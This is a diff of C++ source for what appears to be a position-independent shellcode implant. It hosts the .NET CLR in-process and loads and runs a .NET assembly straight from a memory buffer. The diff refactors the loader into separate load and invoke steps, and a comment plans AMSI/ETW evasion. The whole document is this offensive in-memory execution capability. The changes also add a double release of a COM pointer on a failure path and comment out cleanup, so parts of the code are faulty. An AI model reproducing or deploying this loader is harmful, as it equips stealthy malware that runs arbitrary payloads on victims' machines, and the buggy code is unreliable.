@@ -82,25 +82,20 @@ declfn BOOL instance::hostCLR(LPCWSTR netVer, LPVOID *ppClrMetaHost, ICLRRuntime
 //may implement AMSI/ETW stuff later too
 //declfn BOOL instance::receiveASM(){}
 
-declfn BOOL instance::invokeASM(ICorRuntimeHost* pICorRuntimeHost, BYTE* pData, DWORD cbData){
+declfn BOOL instance::loadASM(ICorRuntimeHost* pICorRuntimeHost, BYTE* pData, DWORD cbData, mscorlib::_Assembly** pAssembly){
 
   //Definte CLR variables
   IUnknown* pAppDomainThunk = NULL;
   mscorlib::_AppDomain* pDefaultAppDomain = NULL;
-  mscorlib::_Assembly* pAssembly = NULL;
-  mscorlib::_Type* pType = NULL;
-  mscorlib::_MethodInfo* pMethodInfo = NULL;
 
   const GUID IID__AppDomain = { 0x05f696dc, 0x2b29, 0x3663, { 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13} };
-  const GUID IID__Assembly = { 0x17156360, 0x2f1a, 0x384a, { 0xbc, 0x52, 0xfd, 0xe9, 0x3c, 0x21, 0x5c, 0x5b} };
-  const GUID IID__Type { 0xbca8b44d, 0xaad6, 0x3a86, { 0x8a, 0xb7, 0x3, 0x34, 0x9f, 0x4f, 0x2d, 0xa2} };
-  const GUID IID__MethodInfo = { 0xffcc1b5d, 0xecb8, 0x38dd, { 0x9b, 0xb, 0x65, 0x58, 0x62, 0x89, 0x42, 0x26} };
   HRESULT hr;
 
   pICorRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
   hr = pAppDomainThunk->QueryInterface(IID__AppDomain, (void**)&pDefaultAppDomain);
   pAppDomainThunk->Release();
   if(FAILED(hr)){
+	pAppDomainThunk->Release();
 	return FALSE;
   }
 
@@ -109,6 +104,7 @@ declfn BOOL instance::invokeASM(ICorRuntimeHost* pICorRuntimeHost, BYTE* pData, 
   sBytes.cElements = cbData;
 
   SAFEARRAY *pArray = oleaut32.SafeArrayCreate(VT_UI1, 1, &sBytes);
+
   void *pArrayData = NULL;
 
   oleaut32.SafeArrayAccessData(pArray, &pArrayData);
@@ -116,13 +112,20 @@ declfn BOOL instance::invokeASM(ICorRuntimeHost* pICorRuntimeHost, BYTE* pData, 
   oleaut32.SafeArrayUnaccessData(pArray);
 
   SAFEARRAY* pArrayArg = pArray;
-  pDefaultAppDomain->Load_3(pArrayArg, &pAssembly);
+  pDefaultAppDomain->Load_3(pArrayArg, pAssembly);
+  return TRUE;
+};
 
+declfn BOOL instance::invokeASM(mscorlib::_Assembly* pAssembly){
+  mscorlib::_MethodInfo* pMethodInfo = NULL;
+  const GUID IID__MethodInfo = { 0xffcc1b5d, 0xecb8, 0x38dd, { 0x9b, 0xb, 0x65, 0x58, 0x62, 0x89, 0x42, 0x26} };
+  HRESULT hr;
+  
   hr = pAssembly->get_EntryPoint(&pMethodInfo);
   if (FAILED(hr)) {
     pAssembly->Release();
-    pDefaultAppDomain->Release();
-    oleaut32.SafeArrayDestroy(pArray);
+    //pDefaultAppDomain->Release();
+    //oleaut32.SafeArrayDestroy(pArray);
     return FALSE;
   }
 
@@ -136,26 +139,30 @@ declfn BOOL instance::invokeASM(ICorRuntimeHost* pICorRuntimeHost, BYTE* pData, 
   oleaut32.VariantInit(&retVal);
     
   hr = pMethodInfo->Invoke_3(obj, psa, &retVal);
+  if (FAILED(hr)){
+	pMethodInfo->Release();
+	pAssembly->Release();
+	oleaut32.SafeArrayDestroy(psa);
+	return FALSE;
+  }
 
-  oleaut32.SafeArrayDestroy(pArray);
   oleaut32.SafeArrayDestroy(psa);
   oleaut32.VariantClear(&obj);
   oleaut32.VariantClear(&retVal);
   pAssembly->Release();
   pMethodInfo->Release();
-  pDefaultAppDomain->Release();
   return TRUE;
-};
+}
 
 auto declfn instance::start(
     _In_ void* arg
 ) -> void {
 
-  user32.handle = reinterpret_cast<uintptr_t>(kernel32.LoadLibraryA(symbol<const char*>("user32.dll")));
-  if (!user32.handle) {
-      return;
-  }
-  RESOLVE_IMPORT(user32);
+  //user32.handle = reinterpret_cast<uintptr_t>(kernel32.LoadLibraryA(symbol<const char*>("user32.dll")));
+  //if (!user32.handle) {
+  //    return;
+  //}
+  //RESOLVE_IMPORT(user32);
 
   mscoree.handle = reinterpret_cast<uintptr_t>(kernel32.LoadLibraryA(symbol<const char*>("mscoree.dll")));
   if (!mscoree.handle) {
@@ -522,11 +529,19 @@ auto declfn instance::start(
   LPVOID pClrMetaHost = NULL;
   ICLRRuntimeInfo* pIClrRuntimeInfo = NULL;
   ICorRuntimeHost* pICorRuntimeHost = NULL;
+  mscorlib::_Assembly* pAssembly = NULL;
 
-  if (mscoree.handle){
-	//Hard coded v4.0 because I'm lazy (How often is 2 anyway?)
-    if (this->hostCLR(L"v4.0.30319", &pClrMetaHost, &pIClrRuntimeInfo, &pICorRuntimeHost) == TRUE){
-      this->invokeASM(pICorRuntimeHost, pData, cbData);
-	};
-  }
+    if (mscoree.handle) {
+        //Hard coded v4.0 because I'm lazy (How often is 2 anyway?)
+        if (this->hostCLR(L"v4.0.30319", &pClrMetaHost, &pIClrRuntimeInfo, &pICorRuntimeHost)) {
+			//here you can modify controls/whatever before loading
+            if (this->loadASM(pICorRuntimeHost, pData, cbData, &pAssembly)) {
+				//here you can modify controls/whatever before invoking
+                this->invokeASM(pAssembly);
+            }
+        }
+        pICorRuntimeHost->Release();
+        pIClrRuntimeInfo->Release();
+        reinterpret_cast<ICLRMetaHost*>(pClrMetaHost)->Release();
+    }
 }
